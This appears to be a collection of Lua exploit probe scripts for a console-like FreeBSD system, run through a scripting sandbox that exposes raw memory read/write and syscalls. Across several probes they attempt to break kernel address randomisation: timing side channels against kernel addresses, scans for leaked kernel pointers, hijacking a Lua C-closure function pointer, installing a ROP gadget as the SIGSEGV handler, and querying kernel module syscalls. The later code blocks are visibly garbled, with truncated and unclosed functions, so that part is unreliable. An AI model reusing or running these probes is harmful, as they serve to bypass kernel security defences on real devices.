print(string.format("  delta1=%d ns  delta2=%d ns", t2 - t1, t3 - t2))

if t1 == 0 and t2 == 0 then
    print("  clock_gettime FAILED — trying CLOCK_REALTIME")
    local function get_ns_rt()
        safe_wq(ts, uint64(0))
        safe_wq(ts + 8, uint64(0))
        pcall(function() sc_clock(uint64(0), uint64(ts)) end)
        local sec = safe_rd(ts) or 0
        local nsec = safe_rd(ts + 8) or 0
        return sec * 1000000000 + nsec
    end
    t1 = get_ns_rt()
    t2 = get_ns_rt()
    print(string.format("  RT: t1=%d t2=%d delta=%d", t1, t2, t2 - t1))
    if t1 > 0 then
        get_ns = get_ns_rt
    end
end

-- ============================================================
-- [C] Timing probe — write() with kernel VA
-- Average over many iterations to get signal above noise
-- ============================================================
print("")
print("[C] Timing probe")

local sc_write = make_syscall(4)
local test_buf = memory.alloc(64)
safe_wd(test_buf, 0x41)

-- Measure valid write
local ITERS = 100
local sum_valid = 0
for i = 1, ITERS do
    local ta = get_ns()
    pcall(function() sc_write(uint64(1), uint64(test_buf), uint64(1)) end)
    local tb = get_ns()
    sum_valid = sum_valid + (tb - ta)
end
print(string.format("  write(valid) avg=%d ns", sum_valid / ITERS))

-- Measure unmapped write
local sum_unmap = 0
for i = 1, ITERS do
    local ta = get_ns()
    pcall(function() sc_write(uint64(1), uint64("0x7DEAD0000000"), uint64(1)) end)
    local tb = get_ns()
    sum_unmap = sum_unmap + (tb - ta)
end
print(string.format("  write(unmapped) avg=%d ns", sum_unmap / ITERS))

-- Measure kernel VA writes
local kvas = {
    {name="0xFFFF800000000000", addr="0xFFFF800000000000"},
    {name="0xFFFF800040000000", addr="0xFFFF800040000000"},
    {name="0xFFFFFFFF80000000", addr="0xFFFFFFFF80000000"},
    {name="0xFFFFFFFF80200000", addr="0xFFFFFFFF80200000"},
    {name="0xFFFFFFFF82000000", addr="0xFFFFFFFF82000000"},
    {name="0xFFFFFFFF84000000", addr="0xFFFFFFFF84000000"},
}

for _, kv in ipairs(kvas) do
    local sum_k = 0
    for i = 1, ITERS do
        local ta = get_ns()
        pcall(function() sc_write(uint64(1), uint64(kv.addr), uint64(1)) end)
        local tb = get_ns()
        sum_k = sum_k + (tb - ta)
    end
    print(string.format("  write(%s) avg=%d ns", kv.name, sum_k / ITERS))
end

-- ============================================================
-- [D] Scan libkernel FULL range (text through data+bss)
-- text base → data base + data size covers everything
-- ============================================================
print("")
print("[D] libkernel full range scan (text→data end)")

local sc_info = make_syscall(593)
local lk_info = memory.alloc(0x200)
safe_wd(lk_info, 0x160)
pcall(function() sc_info(uint64(0x2001), lk_info) end)

local lk_text_lo = safe_rd(lk_info + 0x108) or 0
local lk_text_hi = safe_rd(lk_info + 0x10C) or 0
local lk_text_sz = safe_rd(lk_info + 0x110) or 0
local lk_data_lo = safe_rd(lk_info + 0x118) or 0
local lk_data_hi = safe_rd(lk_info + 0x11C) or 0
local lk_data_sz = safe_rd(lk_info + 0x120) or 0

print(string.format("  text: 0x%X_%08X +0x%X", lk_text_hi, lk_text_lo, lk_text_sz))
print(string.format("  data: 0x%X_%08X +0x%X", lk_data_hi, lk_data_lo, lk_data_sz))

-- The gap between text end and data start might contain .rodata, .bss
local text_end_lo = lk_text_lo + lk_text_sz
local text_end_hi = lk_text_hi
if text_end_lo >= 0x100000000 then text_end_hi = text_end_hi + 1; text_end_lo = text_end_lo - 0x100000000 end

local data_end_lo = lk_data_lo + lk_data_sz
local data_end_hi = lk_data_hi
if data_end_lo >= 0x100000000 then data_end_hi = data_end_hi + 1; data_end_lo = data_end_lo - 0x100000000 end

print(string.format("  text end: 0x%X_%08X", text_end_hi, text_end_lo))
print(string.format("  data end: 0x%X_%08X", data_end_hi, data_end_lo))

-- Scan gap between text end and data start
local gap_start_h, gap_start_l = text_end_hi, text_end_lo
local gap_kptrs = 0

-- Scan from text end to data start (the .rodata/.bss gap)
-- But be careful — text is XO so reading it crashes! Only read RO/RW pages
-- Start from data base and go PAST data_sz to find .bss
-- .bss follows .data and might extend beyond reported data_sz
local bss_scan_extra = 0x20000  -- scan 128KB past data end
local bss_kptrs = 0

for off = 0, lk_data_sz + bss_scan_extra - 1, 8 do
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val == nil then
        -- Hit unmapped page — stop extending
        if off > lk_data_sz then
            print(string.format("  .bss ends at data+0x%X (unmapped)", off))
            break
        end
    elseif is_kptr(val) then
        bss_kptrs = bss_kptrs + 1
        if bss_kptrs <= 20 then
            local region = off < lk_data_sz and ".data" or ".bss"
            print(string.format("  %s+0x%05X: %s", region, off, hexval(val)))
        end
    end
end
print(string.format("  libkernel data+bss kptrs (true): %d", bss_kptrs))

-- ============================================================
-- [E] getrusage(117) — process resource usage from kernel
-- May contain timing info or kernel-side pointers
-- ============================================================
print("")
print("[E] getrusage")

local sc_rusage = make_syscall(117)
local rubuf = memory.alloc(0x100)
for i = 0, 0x3F do safe_wd(rubuf + i*4, 0) end

-- RUSAGE_SELF = 0
local rok, rret = pcall(function() return sc_rusage(uint64(0), uint64(rubuf)) end)
local r_ret = rok and to_num(rret) or -999
print("  ret=" .. r_ret)

if r_ret == 0 then
    -- Scan for kernel pointers
    for off = 0, 0xF0, 8 do
        local val = safe_rq(rubuf + off)
        if val then
            local vh, vl = get_hi_lo(val)
            if vh ~= 0 or vl ~= 0 then
                local tag = ""
                if is_any_kernel(val) then tag = " KRANGE!" end
                if is_kptr(val) then tag = " KPTR!" end
                if off < 32 or tag ~= "" or vl > 0 then
                    print(string.format("  +0x%02X: %s%s", off, hexval(val), tag))
                end
            end
        end
    end
end

-- ============================================================
-- [F] Try reading the thread control block (TCB)
-- sysarch GET_FSBASE returned 0x88xxxxxxxx (userland)
-- But the TCB struct itself may contain kernel pointers
-- ============================================================
print("")
print("[F] TCB/FS_BASE deep scan")

local sc_sysarch = make_syscall(165)
local fsbase_buf = memory.alloc(16)
safe_wq(fsbase_buf, uint64(0))

-- GET_FSBASE = 129... no that's SET. GET_FSBASE = 128
local saok, saret = pcall(function()
    return sc_sysarch(uint64(128), uint64(fsbase_buf))
end)
local sa_ret = saok and to_num(saret) or -999
local fsbase = safe_rq(fsbase_buf)
print(string.format("  sysarch(128) ret=%d fsbase=%s", sa_ret, hexval(fsbase)))

if fsbase and sa_ret == 0 then
    local fh, fl = get_hi_lo(fsbase)
    if fh > 0 or fl > 0 then
        -- Scan TCB structure (typically ~0x100 bytes)
        print("  TCB scan:")
        local tcb_kptrs = 0
        for off = -0x100, 0x200, 8 do
            local a_l = fl + off
            local a_h = fh
            if a_l < 0 then a_h = a_h - 1; a_l = a_l + 0x100000000 end
            if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
            local addr_ok, val = pcall(function()
                return memory.read_qword(uint64(string.format("0x%X%08X", a_h, a_l)))
            end)
            if addr_ok and val then
                if is_kptr(val) then
                    tcb_kptrs = tcb_kptrs + 1
                    print(string.format("    FS%+d: %s KPTR!", off, hexval(val)))
                elseif is_any_kernel(val) then
                    local vh, vl = get_hi_lo(val)
                    print(string.format("    FS%+d: %s KRANGE", off, hexval(val)))
                end
            end
        end
        print("  TCB kptrs: " .. tcb_kptrs)
    end
end

collectgarbage("restart")

print("")
print("=== PROBE 56j COMPLETE ===")
```

## probes/phase14_final_push/56k2_signal_oracle.lua

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 56k2: KASLR via signal handler fault recovery
--
-- Context: 56k confirmed sigaction(SIGSEGV) installs (ret=0).
-- Old handler was at eboot+offset (0x5BC898F4).
-- mincore crashed the process — skip all mincore/msync/madvise.
--
-- Plan:
--   [A] Setup + find gadget
--   [B] Install SIGSEGV handler
--   [C] Test fault recovery: redirect CClosure to unmapped userland VA
--   [D] If C survives: redirect to kernel VAs, time the fault
--   [E] If D shows timing diff: scan KASLR range

print("=== PROBE 56k2: SIGNAL ORACLE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- Get eboot base
local sc_info = make_syscall(593)
local info_buf = memory.alloc(0x200)
safe_wd(info_buf, 0x160)
pcall(function() sc_info(uint64(0), info_buf) end)
local eb_lo = safe_rd(info_buf + 0x108) or 0
local eb_hi = safe_rd(info_buf + 0x10C) or 0
local eb_sz = safe_rd(info_buf + 0x110) or 0
local eb_base = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("  eboot: 0x%X_%08X +0x%X", eb_hi, eb_lo, eb_sz))

-- Find xor eax,eax;ret gadget (31 C0 C3)
local gadget_ret0 = nil
local gadget_ret = nil
for off = 0, math.min(eb_sz - 3, 0x200000), 1 do
    local b = safe_rd(eb_base + off)
    if b then
        local b0 = b % 256
        local b1 = math.floor(b / 256) % 256
        local b2 = math.floor(b / 65536) % 256
        if not gadget_ret0 and b0 == 0x31 and b1 == 0xC0 and b2 == 0xC3 then
            gadget_ret0 = eb_base + off
            print(string.format("  xor eax,eax;ret at +0x%X", off))
        end
        if not gadget_ret and b0 == 0xC3 then
            gadget_ret = eb_base + off
        end
        if gadget_ret0 then break end
    end
end

-- Get rawequal CClosure (same parser as 56c which works)
local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

local cc_addr = parse_func_addr(rawequal)
if cc_addr then
    print("  rawequal CClosure: " .. hexval(cc_addr))
end

if not cc_addr then
    print("FATAL: no CClosure address")
    return
end

local orig_fn = safe_rq(cc_addr + 0x20)
print("  original +0x20: " .. hexval(orig_fn))

-- Timer
local sc_clock = make_syscall(232)
local ts_buf = memory.alloc(16)
local function get_ns()
    safe_wq(ts_buf, uint64(0))
    safe_wq(ts_buf + 8, uint64(0))
    pcall(function() sc_clock(uint64(4), uint64(ts_buf)) end)
    local sec = safe_rd(ts_buf) or 0
    local nsec = safe_rd(ts_buf + 8) or 0
    return sec * 1000000000 + nsec
end

-- Verify timer works
local t1 = get_ns()
local t2 = get_ns()
print(string.format("  timer delta: %d ns", t2 - t1))

-- ============================================================
-- [B] Install SIGSEGV handler
-- Use the OLD handler address (0x5BC898F4 range) — that's the Lua
-- runtime's own crash handler. Or use our gadget.
-- Actually: try installing xor eax,eax;ret as handler.
-- When SIGSEGV fires, handler runs, returns 0, then the signal
-- trampoline calls sigreturn with the ORIGINAL faulting context.
-- This will LOOP (re-execute the fault). We need to modify ucontext.
--
-- Alternative approach: try SIG_IGN (handler=1) first.
-- On FreeBSD, SIG_IGN for SIGSEGV is supposed to be rejected...
-- but Sony might allow it.
--
-- Better: use SA_RESETHAND (0x4) so handler runs once then resets.
-- After reset, the next SIGSEGV kills process. This doesn't loop
-- but only gives us ONE fault recovery.
--
-- Best: keep the Lua runtime's original handler intact. The runtime
-- may use setjmp/longjmp for its pcall implementation. If the
-- original handler does longjmp, pcall would catch the fault!
-- ============================================================
print("")
print("[B] Signal handler setup")

local sc_sigaction = make_syscall(416)

-- First: read the CURRENT handler (the runtime's)
local sa_old = memory.alloc(0x40)
for i = 0, 15 do safe_wd(sa_old + i*4, 0) end

local sa_ok, sa_ret = pcall(function()
    return sc_sigaction(uint64(11), uint64(0), uint64(sa_old))
end)
local sa_rv = sa_ok and to_num(sa_ret) or -999
print("  read current handler: ret=" .. sa_rv)

local cur_handler = safe_rq(sa_old)
local cur_flags = safe_rd(sa_old + 8) or 0
print("  current handler: " .. hexval(cur_handler))
print(string.format("  current flags: 0x%X", cur_flags))

-- Test: does the EXISTING handler let pcall recover from a fault?
-- Try redirecting CClosure to a definitely-unmapped USERLAND address
-- If pcall catches it, the runtime's handler works for us!
print("")
print("[C] Fault recovery test (unmapped userland)")
print("  redirecting rawequal to 0x00007FFF_DEAD0000...")
print("  (if no output after this, process crashed)")

safe_wq(cc_addr + 0x20, uint64("0x00007FFFDEAD0000"))
local fault_ok, fault_ret = pcall(function() return rawequal(1, 2) end)
safe_wq(cc_addr + 0x20, orig_fn)

print("  pcall returned: ok=" .. tostring(fault_ok) .. " ret=" .. tostring(fault_ret))

if not fault_ok then
    print("  ** pcall CAUGHT the fault! **")
    print("  Lua runtime signal handler does longjmp recovery!")

    -- Now test with kernel VAs
    print("")
    print("[D] Kernel VA fault timing")

    local test_addrs = {
        {name="unmapped user",    addr="0x00007FFFDEAD0000"},
        {name="unmapped kernel",  addr="0xFFFFFFFFF0000000"},
        {name="KERNBASE",         addr="0xFFFFFFFF80000000"},
        {name="KERNBASE+170MB",   addr="0xFFFFFFFF8A9C0000"},
        {name="KERNBASE+485MB",   addr="0xFFFFFFFF9E3F0000"},
        {name="KERNBASE+100MB",   addr="0xFFFFFFFF86400000"},
        {name="KERNBASE+300MB",   addr="0xFFFFFFFF92C00000"},
        {name="KERNBASE+600MB",   addr="0xFFFFFFFFA5800000"},
        {name="KERNBASE+800MB",   addr="0xFFFFFFFFB0000000"},
        {name="KERNBASE+1GB",     addr="0xFFFFFFFFC0000000"},
    }

    local ITERS = 50

    for _, t in ipairs(test_addrs) do
        local sum_t = 0
        local samples = {}
        local all_ok = true

        for i = 1, ITERS do
            local ta = get_ns()
            safe_wq(cc_addr + 0x20, uint64(t.addr))
            local ok = pcall(function() return rawequal(1, 2) end)
            safe_wq(cc_addr + 0x20, orig_fn)
            local tb = get_ns()
            if not ok then
                sum_t = sum_t + (tb - ta)
                if i <= 5 then samples[i] = tb - ta end
            else
                -- Unexpectedly succeeded?!
                print(string.format("  ** %s: rawequal SUCCEEDED (addr is executable!) **", t.name))
                all_ok = false
                break
            end
        end

        if all_ok then
            print(string.format("  %s: avg=%d ns  [%s]",
                t.name, sum_t / ITERS,
                table.concat({
                    tostring(samples[1] or 0),
                    tostring(samples[2] or 0),
                    tostring(samples[3] or 0),
                    tostring(samples[4] or 0),
                    tostring(samples[5] or 0)
                }, ",")))
        end
    end

    -- ============================================================
    -- [E] KASLR scan if timing oracle works
    -- Scan KERNBASE to KERNBASE+1GB in 2MB steps
    -- Look for timing anomalies
    -- ============================================================
    print("")
    print("[E] KASLR range scan (2MB steps, 0x80000000-0xC0000000)")

    local SCAN_ITERS = 30
    local KERNBASE_HI = 0xFFFFFFFF
    local KERNBASE_LO = 0x80000000
    local STEP = 0x200000
    local NUM_CAND = 512  -- 1GB / 2MB

    -- Get baseline: unmapped kernel VA timing
    local baseline_sum = 0
    for i = 1, SCAN_ITERS do
        local ta = get_ns()
        safe_wq(cc_addr + 0x20, uint64("0xFFFFFFFFF0000000"))
        pcall(function() return rawequal(1, 2) end)
        safe_wq(cc_addr + 0x20, orig_fn)
        local tb = get_ns()
        baseline_sum = baseline_sum + (tb - ta)
    end
    local baseline_avg = baseline_sum / SCAN_ITERS
    print(string.format("  baseline (unmapped): %d ns", baseline_avg))

    -- Threshold: 20% deviation from baseline
    local threshold = baseline_avg * 0.2

    local hits = {}
    for ci = 0, NUM_CAND - 1 do
        local cand_lo = KERNBASE_LO + ci * STEP
        local cand_hi = KERNBASE_HI
        local addr_str = string.format("0x%08X%08X", cand_hi, cand_lo)

        local sum_c = 0
        for i = 1, SCAN_ITERS do
            local ta = get_ns()
            safe_wq(cc_addr + 0x20, uint64(addr_str))
            pcall(function() return rawequal(1, 2) end)
            safe_wq(cc_addr + 0x20, orig_fn)
            local tb = get_ns()
            sum_c = sum_c + (tb - ta)
        end
        local avg_c = sum_c / SCAN_ITERS

        if math.abs(avg_c - baseline_avg) > threshold then
            hits[#hits + 1] = {addr=addr_str, avg=avg_c, diff=avg_c - baseline_avg}
            print(string.format("  HIT: %s avg=%d diff=%+d", addr_str, avg_c, avg_c - baseline_avg))
        end

        -- Progress every 64 candidates
        if ci % 64 == 63 then
            print(string.format("  ...scanned %d/%d", ci + 1, NUM_CAND))
        end
    end

    print(string.format("  scan complete: %d hits / %d candidates", #hits, NUM_CAND))

    if #hits > 0 and #hits < 20 then
        print("")
        print("  Top hits:")
        for _, h in ipairs(hits) do
            print(string.format("    %s avg=%d diff=%+d", h.addr, h.avg, h.diff))
        end
    elseif #hits >= 20 then
        print("  too many hits — oracle too noisy or no differentiation")
    else
        print("  no timing anomalies found")
    end

elseif fault_ok then
    print("  rawequal SUCCEEDED with unmapped addr — unexpected!")
    print("  ret=" .. tostring(fault_ret))
    -- This means the fault didn't happen? Or the function somehow ran?
    -- Try reading what rawequal returned

    -- Try with a kernel VA
    print("")
    print("[D] Testing kernel VA (non-fault path)")
    safe_wq(cc_addr + 0x20, uint64("0xFFFFFFFF80000000"))
    local k_ok, k_ret = pcall(function() return rawequal(1, 2) end)
    safe_wq(cc_addr + 0x20, orig_fn)
    print("  kernel VA: ok=" .. tostring(k_ok) .. " ret=" .. tostring(k_ret))
else
    print("  PROCESS SURVIVED but pcall behavior unclear")
    print("  fault_ok type: " .. type(fault_ok))
end

collectgarbage("restart")

print("")
print("=== PROBE 56k2 COMPLETE ===")
```

```lua
-- CRASH_CLASS: MODERATE
-- PROBE 56k3: External oracle — does crash behavior differ by address type?
--
-- Context: 56k2 showed pcall does NOT catch SIGSEGV from CClosure redirect.
-- But the process survived (COMPLETE, 754 bytes) — runtime's handler does
-- graceful cleanup, not hard kill. If the crash dump / response size / timing
-- differs between mapped kernel VA and unmapped kernel VA, that's our oracle.
--
-- Plan:
--   [A] Setup (parse_func_addr from 56c, gadget scan, timer)
--   [B] Print a marker, then redirect to ONE test address, let it crash
--   [C] The Python driver sends this probe repeatedly with different addrs
--
-- This probe tests a SINGLE address passed via the ADDR variable.
-- Run via: python tools/kaslr_external_oracle.py

print("=== PROBE 56k3: EXTERNAL ORACLE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function parse_func_addr(fn)
    local s = tostring(fn)
    local hex = s:match("0x([0-9a-fA-F]+)")
    if not hex then hex = s:match(":%s*([0-9a-fA-F]+)%s*$") end
    if not hex then hex = s:match("([0-9a-fA-F][0-9a-fA-F][0-9a-fA-F]+)") end
    if hex then return uint64("0x" .. hex) end
    return nil
end

collectgarbage("stop")

-- [A] Setup
local sc_info = make_syscall(593)
local info_buf = memory.alloc(0x200)
safe_wd(info_buf, 0x160)
pcall(function() sc_info(uint64(0), info_buf) end)
local eb_lo = safe_rd(info_buf + 0x108) or 0
local eb_hi = safe_rd(info_buf + 0x10C) or 0
local eb_sz = safe_rd(info_buf + 0x110) or 0
local eb_base = uint64(string.format("0x%X%08X", eb_hi, eb_lo))

local gadget_ret0 = nil
for off = 0, math.min(eb_sz - 3, 0x200000), 1 do
    local b = safe_rd(eb_base + off)
    if b then
        local b0 = b % 256
        local b1 = math.floor(b / 256) % 256
        local b2 = math.floor(b / 65536) % 256
        if b0 == 0x31 and b1 == 0xC0 and b2 == 0xC3 then
            gadget_ret0 = eb_base + off
            break
        end
    end
end

local cc_addr = parse_func_addr(rawequal)
if not cc_addr then
    print("FATAL: no CClosure")
    return
end
local orig_fn = safe_rq(cc_addr + 0x20)

-- Timer
local sc_clock = make_syscall(232)
local ts_buf = memory.alloc(16)
local function get_ns()
    safe_wq(ts_buf, uint64(0))
    safe_wq(ts_buf + 8, uint64(0))
    pcall(function() sc_clock(uint64(4), uint64(ts_buf)) end)
    local sec = safe_rd(ts_buf) or 0
    local nsec = safe_rd(ts_buf + 8) or 0
    return sec * 1000000000 + nsec
end

-- [B] Test multiple addresses in sequence
-- Each one: redirect, call, restore. If pcall doesn't catch it (which we
-- know it doesn't for unmapped userland), the crash handler runs and we
-- lose control. So test ONE address per connection.
--
-- But first: let's try a DIFFERENT approach. Instead of redirecting to the
-- target address (which tries to EXECUTE it), let's see if we can use the
-- CClosure redirect to call a KNOWN function (like a syscall wrapper) with
-- the target address as an argument.
--
-- Specifically: what if we redirect rawequal's +0x20 to the C function
-- behind madvise/mincore/etc via another CClosure? No — those crash.
--
-- New idea: what about redirecting to the sigaction C function itself?
-- We could try to install a handler at the target kernel VA and check
-- if sigaction returns differently.
-- No — sigaction handler must be userland.
--
-- Simplest viable test: try MULTIPLE kernel VAs in sequence, printing a
-- marker between each. The crash handler may allow some to survive if the
-- Lua runtime resets after each fault.
--
-- Actually, let's just test what the runtime's handler does more carefully.
-- Test 1: redirect to unmapped userland → observe output
-- Test 2: redirect to mapped kernel VA (KERNBASE) → observe output
-- If Test 1 produces output and Test 2 produces different output, oracle works.

print("SETUP_OK")
print(string.format("eboot=0x%X%08X cc=%s orig=%s",
    eb_hi, eb_lo, hexval(cc_addr), hexval(orig_fn)))

-- First try: maybe sigaction with OUR handler makes pcall work?
-- Install xor eax,eax;ret as handler with SA_SIGINFO (0x40)
if gadget_ret0 then
    local sa_new = memory.alloc(0x40)
    for i = 0, 15 do safe_wd(sa_new + i*4, 0) end
    safe_wq(sa_new, gadget_ret0)          -- sa_handler = xor eax,eax;ret
    safe_wd(sa_new + 8, 0x40)             -- SA_SIGINFO
    safe_wq(sa_new + 0x10, uint64(0))     -- sa_mask = empty

    local sc_sigaction = make_syscall(416)
    local sa_old = memory.alloc(0x40)
    local sa_ok, sa_ret = pcall(function()
        return sc_sigaction(uint64(11), uint64(sa_new), uint64(sa_old))
    end)
    print(string.format("sigaction install: ok=%s ret=%s",
        tostring(sa_ok), tostring(sa_ok and to_num(sa_ret) or "err")))

    if sa_ok and to_num(sa_ret) == 0 then
        -- Handler installed. Now test: does pcall catch fault with OUR handler?
        -- Our handler does xor eax,eax;ret which returns to sigreturn trampoline.
        -- sigreturn restores the faulting context → re-executes fault → infinite loop.
        -- To avoid infinite loop, we need SA_RESETHAND (0x4).
        -- After first fault: handler runs, then gets reset to SIG_DFL.
        -- Second fault: process killed by SIG_DFL.
        -- So we still can't loop. But maybe the first handler return is enough
        -- for pcall to notice?

        -- Try with SA_RESETHAND | SA_SIGINFO
        safe_wq(sa_new, gadget_ret0)
        safe_wd(sa_new + 8, 0x44)           -- SA_RESETHAND | SA_SIGINFO
        pcall(function()
            sc_sigaction(uint64(11), uint64(sa_new), uint64(0))
        end)
        print("installed xor-eax-ret handler with SA_RESETHAND|SA_SIGINFO")

        -- Test with unmapped userland
        print("TEST: redirect to 0x41414141_41414141")
        print("MARKER_BEFORE_FAULT")
        local t_before = get_ns()
        safe_wq(cc_addr + 0x20, uint64("0x4141414141414141"))
        local f_ok, f_ret = pcall(function() return rawequal(1, 2) end)
        safe_wq(cc_addr + 0x20, orig_fn)
        local t_after = get_ns()
        print("MARKER_AFTER_FAULT")
        print(string.format("fault: ok=%s ret=%s time=%d",
            tostring(f_ok), tostring(f_ret), t_after - t_before))

        -- If we get here, fault was caught!
        -- Re-install handler for next test
        safe_wq(sa_new, gadget_ret0)
        safe_wd(sa_new + 8, 0x44)
        pcall(function()
            sc_sigaction(uint64(11), uint64(sa_new), uint64(0))
        end)

        print("TEST: redirect to 0xFFFFFFFF_80000000 (KERNBASE)")
        print("MARKER_BEFORE_FAULT_2")
        t_before = get_ns()
        safe_wq(cc_addr + 0x20, uint64("0xFFFFFFFF80000000"))
        f_ok, f_ret = pcall(function() return rawequal(1, 2) end)
        safe_wq(cc_addr + 0x20, orig_fn)
        t_after = get_ns()
        print("MARKER_AFTER_FAULT_2")
        print(string.format("fault2: ok=%s ret=%s time=%d",
            tostring(f_ok), tostring(f_ret), t_after - t_before))
    end
else
    print("no gadget found, skipping custom handler test")
end

collectgarbage("restart")
print("")
print("=== PROBE 56k3 COMPLETE ===")
```

```lua
local function safe_rq(addr)

    return nil
end
local function safe_wd(addr, val)

    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end

local function hexval(val)
    if val == nil then return "nil" end

collectgarbage("stop")

print("[A] Setup")
local sc_getpid = make_syscall(20)
local pid = to_num(sc_getpid())
print("  PID: " .. pid)

-- [B] kldstat — sys 308
-- FreeBSD: int kldstat(int fileid, struct kld_file_stat *stat)
-- struct kld_file_stat {
--   int version;       // +0x00, set to sizeof(struct kld_file_stat)
--   char name[MAXPATHLEN]; // +0x04, 1024 bytes
--   int refs;          // +0x404
--   int id;            // +0x408
--   struct kld_sym_lookup address; // +0x410 (8 bytes on amd64)
--   size_t size;       // +0x418
-- }
-- Total: ~0x420 bytes. version must be set to sizeof before call.
print("")
print("[B] kldstat (sys 308)")

local sc_kldstat = make_syscall(308)
local kstat_buf = memory.alloc(0x500)

-- Try fileid=1 (kernel itself), several struct sizes
local sizes = {0x420, 0x448, 0x460, 0x480, 0x500, 0x100, 0x58}
for _, sz in ipairs(sizes) do
    for i = 0, (sz/4) - 1 do safe_wd(kstat_buf + i*4, 0) end
    safe_wd(kstat_buf, sz)  -- version = sizeof

    local ok, ret = pcall(function()
        return sc_kldstat(uint64(1), uint64(kstat_buf))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  fileid=1 size=0x%X: ret=%d", sz, rv))

    if rv == 0 then
        -- Dump interesting fields
        local ver = safe_rd(kstat_buf) or 0
        print(string.format("    version: %d (0x%X)", ver, ver))

        -- Name at +4
        local name_bytes = {}
        for i = 0, 31 do
            local b = safe_rd(kstat_buf + 4 + i) or 0
            local c = b % 256
            if c == 0 then break end
            name_bytes[#name_bytes + 1] = string.char(c)
        end
        print("    name: " .. table.concat(name_bytes))

        -- refs at +0x404
        local refs = safe_rd(kstat_buf + 0x404) or 0
        print("    refs: " .. refs)

        -- id at +0x408
        local id = safe_rd(kstat_buf + 0x408) or 0
        print("    id: " .. id)

        -- address at +0x410 (8 bytes)
        local addr = safe_rq(kstat_buf + 0x410)
        print("    address: " .. hexval(addr))

        -- size at +0x418
        local size_lo = safe_rd(kstat_buf + 0x418) or 0
        local size_hi = safe_rd(kstat_buf + 0x41C) or 0
        print(string.format("    size: 0x%X%08X", size_hi, size_lo))

        -- Also dump raw hex at key offsets
        print("    raw +0x400..+0x440:")
        for off = 0x400, 0x440, 8 do
            local q = safe_rq(kstat_buf + off)
            print(string.format("      +0x%03X: %s", off, hexval(q)))
        end
        break
    end
end

-- Try fileid=0, 2, 3
for _, fid in ipairs({0, 2, 3}) do
    for i = 0, 0x10F do safe_wd(kstat_buf + i*4, 0) end
    safe_wd(kstat_buf, 0x420)
    local ok, ret = pcall(function()
        return sc_kldstat(uint64(fid), uint64(kstat_buf))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  fileid=%d size=0x420: ret=%d", fid, rv))
end

-- [C] kldnext — sys 307
-- int kldnext(int fileid) — returns next module ID, 0=first
print("")
print("[C] kldnext (sys 307)")
local sc_kldnext = make_syscall(307)
local cur_id = 0
for attempt = 1, 10 do
    local ok, ret = pcall(function()
        return sc_kldnext(uint64(cur_id))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  kldnext(%d) = %d", cur_id, rv))
    if rv <= 0 or rv == cur_id then break end
    cur_id = rv
end

-- [D] kldsym — sys 337
-- int kldsym(int fileid, int cmd, void *data)
-- cmd=1 = KLDSYM_LOOKUP
-- data = struct kld_sym_lookup { int version; char *symname; u_long symvalue; size_t symsize; }
print("")
print("[D] kldsym (sys 337)")
local sc_kldsym = make_syscall(337)
local sym_buf = memory.alloc(0x40)

-- Try to look up "printf" in kernel (fileid=0 = whole kernel)
local name_buf = memory.alloc(32)
-- Write "printf\0"
safe_wd(name_buf, 0x69727070)       -- "prip" (little endian: p=70 r=72 i=69 n=6E)
-- Actually let's be more careful
safe_wd(name_buf, 0x6E697270)       -- prin
safe_wd(name_buf + 4, 0x00006674)   -- tf\0

-- struct kld_sym_lookup at sym_buf:
-- +0x00: version (int, 4 bytes)
-- +0x08: symname (char*, 8 bytes on amd64)
-- +0x10: symvalue (u_long, 8 bytes)
